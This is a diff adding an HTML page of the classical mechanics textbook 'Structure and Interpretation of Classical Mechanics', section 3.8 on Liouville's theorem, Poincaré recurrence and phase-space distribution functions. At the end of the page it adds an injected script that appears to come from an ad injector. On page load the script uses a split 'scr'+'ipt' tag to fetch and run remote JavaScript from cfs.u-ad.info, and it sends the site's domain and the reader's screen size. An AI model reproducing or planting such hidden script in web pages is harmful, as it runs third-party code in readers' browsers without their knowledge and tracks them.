@@ -1,0 +1,431 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-43.html">previous</a></span><span>, <a href="book-Z-H-45.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_3.8"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_3.8">3.8&nbsp;&nbsp;Liouville's Theorem</a></h2>
+<p>
+<a name="%_idx_2034"></a>
+If an ensemble of states occupies a particular volume of phase space
+at one moment, then the subsequent evolution of that volume by the
+flow described by Hamilton's equations may distort the ensemble but
+<a name="%_idx_2036"></a>does not change the volume the ensemble occupies.  The fact that phase-space
+volume is preserved by the phase flow is called <em>Liouville's
+theorem</em>.</p>
+<p>
+We will first illustrate the preservation of phase-space volume with a
+simple example and then prove it in general.</p>
+<p>
+</p>
+<a name="%_sec_Temp_277"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_277">The phase flow for the pendulum</a></h4>
+<p>
+<a name="%_idx_2038"></a><a name="%_idx_2040"></a>Consider an undriven pendulum described by the Hamiltonian:
+<a name="EQUATION_3.145"></a></p>
+<div align=left><img src="chap3-Z-G-165.gif" border="0"></div>
+<p>
+In figure&nbsp;<a href="#FIGURE_3.25">3.25</a> we see the evolution of an
+elliptic region around a point on the <img src="chap1-Z-G-D-19.gif" border="0">-axis, in the oscillation
+region of the pendulum.  Three later positions of the region are shown.
+The region is stretched and sheared by the flow, but the area is 
+preserved.  After many cycles, the starting region will be
+stretched to be a thin layer distributed in the phase angle
+of the pendulum.
+
+<a name="FIGURE_3.25"></a></p>
+<div align=left><img src="chap3-Z-G-166.gif" border="0"></div>
+<p>
+Figure&nbsp;<a href="#FIGURE_3.26">3.26</a> shows a similar evolution
+(for smaller time intervals) of a region straddling the separatrix<a name="call_footnote_Temp_278" href="#footnote_Temp_278"><sup><small>31</small></sup></a> 
+near the unstable equilibrium point.  The phase-space region rapidly
+stretches along the separatrix, while preserving the area.  The 
+initial conditions that start in the
+oscillation region (inside of the separatrix) will continue to spread
+into a thin ring-shaped region, while the initial conditions that
+start outside of the separatrix will spread into a thin region of
+rotation on the outside of the separatrix.
+<a name="FIGURE_3.26"></a></p>
+<div align=left><img src="chap3-Z-G-167.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<a name="%_sec_Temp_279"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_279">Proof of Liouville's theorem</a></h4>
+<p></p>
+<p>
+Consider a set of ordinary differential equations of the form
+<a name="EQUATION_3.146"></a></p>
+<div align=left><img src="chap3-Z-G-168.gif" border="0"></div>
+<p>
+where <em>z</em> is a tuple of <em>N</em> state variables.
+Let <em>R</em>(<em>t</em><sub>1</sub>) be a region of the state space at time <em>t</em><sub>1</sub>.  Each
+element of this region is an initial condition at time <em>t</em><sub>1</sub> for the
+system, and evolves to an element at time <em>t</em><sub>2</sub> according to the
+differential equations.  The set of these elements at time <em>t</em><sub>2</sub> is
+the region <em>R</em>(<em>t</em><sub>2</sub>).  Regions evolve to regions.</p>
+<p>
+The evolution of the system for a time interval <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em> defines a
+map <em>g</em><sub><em>t</em>, <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em></sub> from the state space to itself:
+<a name="EQUATION_3.147"></a></p>
+<div align=left><img src="chap3-Z-G-169.gif" border="0"></div>
+<p>
+Regions map to regions by mapping each element in the region:
+<a name="EQUATION_3.148"></a></p>
+<div align=left><img src="chap3-Z-G-170.gif" border="0"></div>
+<p></p>
+<p>
+The volume <em>V</em>(<em>t</em>) of a region <em>R</em>(<em>t</em>) is <img src="chap1-Z-G-D-2.gif" border="0"><sub><em>R</em>(<em>t</em>)</sub> <img src="chap3-Z-G-D-8.gif" border="0">, where
+<img src="chap3-Z-G-D-8.gif" border="0"> is the function whose value is one for every input.
+The volume of the evolved region <em>R</em>(<em>t</em>  +  <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em>) is
+<a name="EQUATION_3.149"></a></p>
+<div align=left><img src="chap3-Z-G-171.gif" border="0"></div>
+<p>
+<a name="%_idx_2042"></a><a name="%_idx_2044"></a>where Jac(<em>g</em><sub><em>t</em>, <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em></sub>) is the Jacobian of the
+mapping <em>g</em><sub><em>t</em>, <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em></sub>.  The Jacobian is the determinant of the
+derivative of the mapping.</p>
+<p>
+For small <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em> 
+<a name="EQUATION_3.150"></a></p>
+<div align=left><img src="chap3-Z-G-172.gif" border="0"></div>
+<p>
+and thus
+<a name="EQUATION_3.151"></a></p>
+<div align=left><img src="chap3-Z-G-173.gif" border="0"></div>
+<p>
+where <em>I</em> is the identity function, so <em>D</em><em>I</em>(<em>z</em>(<em>t</em>)) is a unit multiplier.
+We can use the fact that if <strong><em>A</em></strong> is an <em>N</em> &times; <em>N</em> square matrix then
+<a name="EQUATION_3.152"></a></p>
+<div align=left><img src="chap3-Z-G-174.gif" border="0"></div>
+<p>
+to show that
+<a name="EQUATION_3.153"></a></p>
+<div align=left><img src="chap3-Z-G-175.gif" border="0"></div>
+<p>
+where
+<a name="EQUATION_3.154"></a></p>
+<div align=left><img src="chap3-Z-G-176.gif" border="0"></div>
+<p>
+Thus
+<a name="EQUATION_3.155"></a></p>
+<div align=left><img src="chap3-Z-G-177.gif" border="0"></div>
+<p>
+So the rate of change of the volume at time <em>t</em> is
+<a name="EQUATION_3.156"></a></p>
+<div align=left><img src="chap3-Z-G-178.gif" border="0"></div>
+<p></p>
+<p>
+Now we compute <em>G</em><sub><em>t</em></sub> for a system described by a
+Hamiltonian&nbsp;<em>H</em>.
+The components of <em>z</em> are the components of the
+coordinates and the momenta: <em>z</em><sup><em>k</em></sup>  =  <em>q</em><sup><em>k</em></sup>, <em>z</em><sup><em>k</em>+<em>n</em></sup>  =  <em>p</em><sub><em>k</em></sub> for <em>k</em>  =  0,
+<tt>...</tt>, <em>n</em> <tt>-</tt> 1.  The components of <em>F</em> are 
+<a name="EQUATION_3.157"></a></p>
+<div align=left><img src="chap3-Z-G-179.gif" border="0"></div>
+<p>
+for <em>k</em>  =  0, <tt>...</tt>, <em>n</em> <tt>-</tt> 1.  The diagonal components of the derivative
+<img src="front-Z-G-D-2.gif" border="0"><sub>1</sub> <em>F</em> are
+<a name="EQUATION_3.158"></a></p>
+<div align=left><img src="chap3-Z-G-180.gif" border="0"></div>
+<p>
+The component partial derivatives commute, so the diagonal components
+with index <em>k</em> and index <em>k</em> + <em>n</em> are equal and opposite.  We see that
+the trace, which is the sum of these diagonal components, is zero.
+Thus the integral of <em>G</em><sub><em>t</em></sub> over the region <em>R</em>(<em>t</em>) is zero, so the derivative of
+the volume at time <em>t</em> is zero.  Because <em>t</em> is arbitrary, the volume
+does not change.  This proves <em>Liouville's theorem</em>: the phase-space 
+flow conserves phase-space volume.</p>
+<p>
+Notice that the proof of Liouville's theorem does not depend upon
+whether or not the Hamiltonian has explicit time dependence.  Liouville's
+theorem holds for systems with time-dependent Hamiltonians.</p>
+<p>
+
+We may think of the ensemble of all possible states as a fluid flowing
+around under the control of the dynamics.  Liouville's theorem says
+that this fluid is incompressible for Hamiltonian systems.</p>
+<p>
+</p>
+<p><a name="%_thm_3.11"></a>
+<b>Exercise 3.11.</b>&nbsp;&nbsp;<strong>Determinants and traces</strong><br>
+Show that equation&nbsp;(<a href="#EQUATION_3.152">3.152</a>) is correct.
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_Temp_281"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_281">Area preservation of stroboscopic surfaces of section</a></h4>
+<p><a name="%_idx_2046"></a><a name="%_idx_2048"></a><a name="%_idx_2050"></a>
+Surfaces of section for periodically driven Hamiltonian systems are
+area preserving if the section coordinates are the phase-space
+coordinate and momentum.  This is an important feature of surfaces of
+section.  It is a consequence of Liouville's theorem for
+one-degree-of-freedom problems.</p>
+<p>
+It is also the case that surfaces of section such as those we have
+used for the H&eacute;non-Heiles problem are area preserving, but we are
+not ready to prove this yet!</p>
+<p>
+
+</p>
+<a name="%_sec_Temp_282"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_282">Poincar&eacute; recurrence</a></h4>
+<p><a name="%_idx_2052"></a><a name="%_idx_2054"></a>
+The <em>Poincar&eacute; recurrence theorem</em> is a remarkable theorem that
+is a trivial consequence of Liouville's theorem.  Loosely, the theorem
+states that almost all trajectories eventually return arbitrarily
+close to where they started.  This is true regardless of whether the
+trajectories are chaotic or regular.</p>
+<p>
+More precisely, consider a Hamiltonian dynamical system for which the
+phase space is a bounded domain <em>D</em>.  We identify some initial point
+in the phase space, say <em>z</em><sub>0</sub>.  Then, for any finite neighborhood <em>U</em>
+of <em>z</em><sub>0</sub> we choose, there are trajectories that emanate from initial
+points in that neighborhood and eventually return to the neighborhood.</p>
+<p>
+We can prove this by considering the successive images of <em>U</em> under
+the time evolution.  For simplicity, we restrict consideration to time
+evolution for a time interval <img src="chap1-Z-G-D-43.gif" border="0">.  The map of the phase space
+onto itself generated by time evolution for an interval <img src="chap1-Z-G-D-43.gif" border="0"> we
+call <em>C</em>.  Subsequent applications of the map generate a discrete time
+evolution.  Sets of points in phase space transform by evolving all
+the points in the set; the image of the set <em>U</em> is denoted <em>C</em>(<em>U</em>).
+Now consider the trajectory of the set <em>U</em>, that is, the sets <em>C</em><sup><em>n</em></sup>(<em>U</em>)
+where <em>C</em><sup><em>n</em></sup> indicates the <em>n</em>-times composition of <em>C</em>.  Now there are
+two possibilities: either the successive images <em>C</em><sup><em>i</em></sup>(<em>U</em>) intersect or
+they do not.  If they do not intersect, then with each iteration, a
+volume of <em>D</em> equal to the volume of <em>U</em> gets ``used up'' and cannot
+belong to the further image.  But the volume of <em>D</em> is finite, so we
+cannot fit an infinite number of non-intersecting finite volumes into
+it.  Therefore, after some number of iterations the images intersect.
+Suppose <em>C</em><sup><em>i</em></sup>(<em>U</em>) intersects with <em>C</em><sup><em>j</em></sup>(<em>U</em>), with <em>j</em>&lt;<em>i</em>, for
+definiteness.  Then the pre-image of each must also intersect, since
+the pre-image of a point in the intersection belongs to both sets.
+Thus <em>C</em><sup><em>i</em><tt>-</tt>1</sup>(<em>U</em>) intersects <em>C</em><sup><em>j</em><tt>-</tt>1</sup>(<em>U</em>).  This can be continued
+until finally we have that <em>C</em><sup><em>i</em><tt>-</tt><em>j</em></sup>(<em>U</em>) intersects <em>U</em>.  So we have proven
+that after <em>i</em> <tt>-</tt> <em>j</em> iterations of the map <em>C</em> there are a set of points
+initially in <em>U</em> that return to the neighborhood <em>U</em>.</p>
+<p>
+So for every neighborhood of every point in the phase space there is a
+subneighborhood such that the trajectories emanating from all of the
+points in that subneighborhood return to that subneighborhood.  Thus
+almost every trajectory returns arbitrarily close to where it started.</p>
+<p>
+</p>
+<a name="%_sec_Temp_283"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_283">The gas in the corner of the room</a></h4>
+<p><a name="%_idx_2056"></a>
+Suppose we have a collection of <em>N</em> classical atoms in a perfectly
+sealed room.  The phase-space dimension of this system is 6<em>N</em>.  A
+point in this phase space is denoted <em>z</em>.  Suppose initially all the
+atoms are, say, within one centimeter of one corner, with arbitrarily
+chosen finite velocities.  This corresponds to some initial point
+<em>z</em><sub>0</sub> in the phase space.  The phase space of the system is limited in
+space by the room and in momentum by energy conservation; the phase
+space is bounded.  The recurrence theorem then says that in the
+neighborhood of <em>z</em><sub>0</sub> there is an initial condition of the system that
+returns to the neighborhood of <em>z</em><sub>0</sub> after some time.  For the
+individual atoms this means that after some time all of the atoms will
+be found in the corner of the room again, and again, and again.  Makes
+one wonder about the <a name="%_idx_2058"></a><a name="%_idx_2060"></a>second law of thermodynamics, doesn't it?<a name="call_footnote_Temp_284" href="#footnote_Temp_284"><sup><small>32</small></sup></a></p>
+<p>
+</p>
+<a name="%_sec_Temp_285"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_285">Nonexistence of attractors in Hamiltonian systems</a></h4>
+<p><a name="%_idx_2064"></a>Some systems have attractors.  An <em>attractor</em> is a region of phase
+space that gobbles volumes of trajectories.  For an attractor there
+is some larger region, the <a name="%_idx_2066"></a>basin of attraction, such that sets of
+trajectories with nonzero volume eventually end up in the attractor
+and never leave it.  The recurrence theorem shows that Hamiltonian
+systems with bounded phase space do not have attractors.  Consider
+some candidate volume in the proposed basin of attraction.  The
+recurrence theorem guarantees that some trajectories in the candidate
+volume return to the volume repeatedly.  Therefore, the volume is not
+in a basin of attraction.  Attractors do not exist in Hamiltonian
+systems with bounded phase space.</p>
+<p>
+This does not mean that every trajectory always returns.  A
+simple example is the pendulum.  Suppose we take a blob of
+trajectories that spans the separatrix, the trajectory that
+asymptotically approaches the unstable equilibrium with the pendulum
+pointed up.  Trajectories with more energy than the separatrix make a
+full loop around and return to their initial point; trajectories with
+lower energy than the separatrix oscillate once across and back to
+their initial position; but the separatrix trajectory itself leaves
+the initial region permanently, and continually approaches the
+unstable point.</p>
+<p>
+</p>
+<a name="%_sec_Temp_286"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_286">Conservation of phase volume in a dissipative system</a></h4>
+<p><a name="%_idx_2068"></a>
+The definition of a dissipative system is not so clear.
+For some, ``dissipative'' implies that phase-space volume is not
+conserved, which is the same as saying the evolution of the system is
+not governed by Hamilton's equations.  For others, ``dissipative''
+implies that friction is present, representing loss of energy to unmodeled
+degrees of freedom.  Here is a curious example.  The damped harmonic
+oscillator is the paradigm of a dissipative system.  Here we show that
+the <a name="%_idx_2070"></a><a name="%_idx_2072"></a><a name="%_idx_2074"></a>damped harmonic oscillator can be described by Hamilton's
+equations and that phase-space volume is conserved.</p>
+<p>
+The damped harmonic oscillator is governed by the ordinary
+differential equation
+<a name="EQUATION_3.159"></a></p>
+<div align=left><img src="chap3-Z-G-181.gif" border="0"></div>
+<p>
+where <img src="chap1-Z-G-D-21.gif" border="0"> is a coefficient of damping.  We can formulate this
+system with the <a name="%_idx_2076"></a>Lagrangian<a name="call_footnote_Temp_287" href="#footnote_Temp_287"><sup><small>33</small></sup></a>
+<a name="EQUATION_3.160"></a></p>
+<div align=left><img src="chap3-Z-G-182.gif" border="0"></div>
+<p>
+<a name="%_idx_2078"></a>The Lagrange equation for this Lagrangian is
+<a name="EQUATION_3.161"></a></p>
+<div align=left><img src="chap3-Z-G-183.gif" border="0"></div>
+<p>
+Since the exponential is never zero this equation has the same
+trajectories as equation&nbsp;(<a href="#EQUATION_3.159">3.159</a>) above.</p>
+<p>
+The momentum conjugate to <em>x</em> is
+<a name="EQUATION_3.162"></a></p>
+<div align=left><img src="chap3-Z-G-184.gif" border="0"></div>
+<p>
+<a name="%_idx_2080"></a>and the Hamiltonian is
+<a name="EQUATION_3.163"></a></p>
+<div align=left><img src="chap3-Z-G-185.gif" border="0"></div>
+<p>
+For this system, the Hamiltonian is not the sum of the kinetic energy
+of the motion of the mass and the potential energy stored in the
+spring.  The value of the Hamiltonian is not conserved
+(<img src="front-Z-G-D-2.gif" border="0"><sub>0</sub> <em>H</em> ne 0).
+<a name="%_idx_2082"></a>Hamilton's equations are
+<a name="EQUATION_3.164"></a></p>
+<div align=left><img src="chap3-Z-G-186.gif" border="0"></div>
+<p></p>
+<p>
+Let's consider a numerical case.  Let <em>m</em> = 5, <em>k</em> = 1/4, 
+<img src="chap1-Z-G-D-21.gif" border="0"> = 3.  Here
+the characteristic roots of the linear constant-coefficient ordinary
+differential equation&nbsp;(<a href="#EQUATION_3.159">3.159</a>) are <em>s</em>  =   <tt>-</tt> 1/10,  <tt>-</tt> 1/2.  Thus the solutions are
+<a name="EQUATION_3.165"></a></p>
+<div align=left><img src="chap3-Z-G-187.gif" border="0"></div>
+<p>
+for <em>A</em><sub>1</sub> and <em>A</em><sub>2</sub> determined by the initial conditions
+<a name="EQUATION_3.166"></a></p>
+<div align=left><img src="chap3-Z-G-188.gif" border="0"></div>
+<p>
+Thus we can form the transformation from the initial state to the
+final state:
+<a name="EQUATION_3.167"></a></p>
+<div align=left><img src="chap3-Z-G-189.gif" border="0"></div>
+<p>
+The transformation is linear, so the area is transformed by the
+determinant, which is 1 in this case.  Thus, contrary to intuition,
+the phase-space volume is conserved.  So why is this not a
+contradiction with the statement that there are no attractors in
+Hamiltonian systems?  The answer is that the Poincar&eacute; recurrence
+argument is true only for bounded phase spaces.  Here, the momentum
+expands exponentially with time (as the coordinate contracts), so it
+is unbounded.</p>
+<p>
+We shouldn't really be too surprised by the way the theory
+protects itself from an apparent paradox -- that the phase volume is
+conserved even though all trajectories decay to zero velocity and
+coordinates.  The proof of Liouville's theorem allows time-dependent
+Hamiltonians.  In this case we are able to model the dissipation by
+just such a time-dependent <a name="%_idx_2084"></a>Hamiltonian.</p>
+<p>
+</p>
+<p><a name="%_thm_3.12"></a>
+<b>Exercise 3.12.</b>&nbsp;&nbsp;<strong>Time-dependent systems</strong><br>
+To make the fact that Liouville's theorem holds for time-dependent
+systems even more concrete, extend the results of
+section&nbsp;<a href="#%_sec_3.8">3.8</a> to show how a swarm of initial points
+outlining an area in the phase space of the <em>driven</em> pendulum
+deforms as it evolves.  Construct pictures analogous to
+figures&nbsp;<a href="#FIGURE_3.25">3.25</a> 
+and <a href="#FIGURE_3.26">3.26</a> for one of the interesting cases
+where we have surfaces of section.  Does the distortion look different
+in different parts of the phase space?  How?
+</p>
+
+<p></p>
+<p>
+
+</p>
+<a name="%_sec_Temp_289"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_289">Distribution functions</a></h4>
+<p><a name="%_idx_2086"></a><a name="%_idx_2088"></a>
+We know the state of a system only approximately.  It is reasonable to
+model our state of knowledge by a <a name="%_idx_2090"></a>probability density function on the
+set of possible states.  Given such incomplete knowledge, what are the
+probable consequences?  As the system evolves, the density function
+also evolves.  Liouville's theorem gives us a handle on this kind of
+problem.</p>
+<p>
+Let <em>f</em>(<em>t</em>, <em>q</em>, <em>p</em>) be a probability density function on the phase space
+at time <em>t</em>.  For this to be a good probability density function we
+require that the integral of <em>f</em> over all coordinates and momenta be
+1 -- it is certain that the system is somewhere.  </p>
+<p>
+There is a set of trajectories that pass through any particular region
+of phase space at a particular time.  These trajectories are
+neither created nor destroyed, and they proceed as a bundle to another
+region of phase space at a later time.  Liouville's theorem tells us
+that the volume of the source region is the same as the volume of the
+target region, so the density must remain constant.  Thus
+<em>D</em>(<em>f</em><small>o</small><img src="chap3-Z-G-D-5.gif" border="0">)  =  0.  If we have a system
+described by the Hamiltonian <em>H</em> then
+<a name="EQUATION_3.168"></a></p>
+<div align=left><img src="chap3-Z-G-190.gif" border="0"></div>
+<p>
+so we may conclude that 
+<a name="EQUATION_3.169"></a></p>
+<div align=left><img src="chap3-Z-G-191.gif" border="0"></div>
+<p>
+or
+<a name="EQUATION_3.170"></a></p>
+<div align=left><img src="chap3-Z-G-192.gif" border="0"></div>
+<p>
+Since this must be true at each moment and since there is a solution
+trajectory that emanates from every point in phase space, we may
+abstract from solution paths and deduce a constraint on&nbsp;<em>f</em>:
+<a name="EQUATION_3.171"></a></p>
+<div align=left><img src="chap3-Z-G-193.gif" border="0"></div>
+<p>
+This linear partial differential equation governs the evolution of the
+density function, and thus shows how our state of knowledge evolves.</p>
+<p>
+
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_278" href="#call_footnote_Temp_278"><sup><small>31</small></sup></a> The separatrix is the curve that separates the oscillating
+motion from the circulating motion.  It is made up of several
+trajectories that are asymptotic to the unstable equilibrium.</p>
+
+<p><a name="footnote_Temp_284" href="#call_footnote_Temp_284"><sup><small>32</small></sup></a> It is reported that when Boltzmann was confronted with this
+<a name="%_idx_2062"></a>problem he responded, ``You should wait that long!''</p>
+
+<p><a name="footnote_Temp_287" href="#call_footnote_Temp_287"><sup><small>33</small></sup></a> This is just the product of the
+Lagrangian for the undamped harmonic oscillator with an increasing
+exponential of time.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-43.html">previous</a></span><span>, <a href="book-Z-H-45.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2V1JYYVxdUKkKs3rt0YFOEw%2bosRFBlPOq8sOwwMI3Ng1ouO%2bb9PEDjFApwFoGjnEv8oXfh3n0OFQAyVzar17mlh0SbPyuixVHiLXK%2bjd%2fKxuLZTd2qufmAhMAPfPQ%2b6BoSS1EmybGcyeAKLA6Vyc7X6ET5sgO6n8YsQE5LVQcHA59SDsawBM2rs5kOA0zt04HTt%2fhDWEI%2byK0qS7%2faGvot4vxwA4fiV81Vx6SgllLeuBaw6xff6qn34A0Fi2ohNvXHXpdjgYwUlKYfTuTYSLcRVQ3NZjaXgD5N3vpigqRNGSrEsXvz0KWdQi0gTcXsFf4y8%2beDTw4WlkILYpUso6kdMzhWfzM%2fhnxw1UULZ3RC96z69xgNzDhlxKOA0zpOEJiVDLz7KbZrvH3f8Y4QkzgSQ1mi2bl3QQ3eNGd4Oh%2fOx8kSx%2f%2f468u8T8VDgQFTfyRGyfPcYhyHa%2bWhfs2qWQqr");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
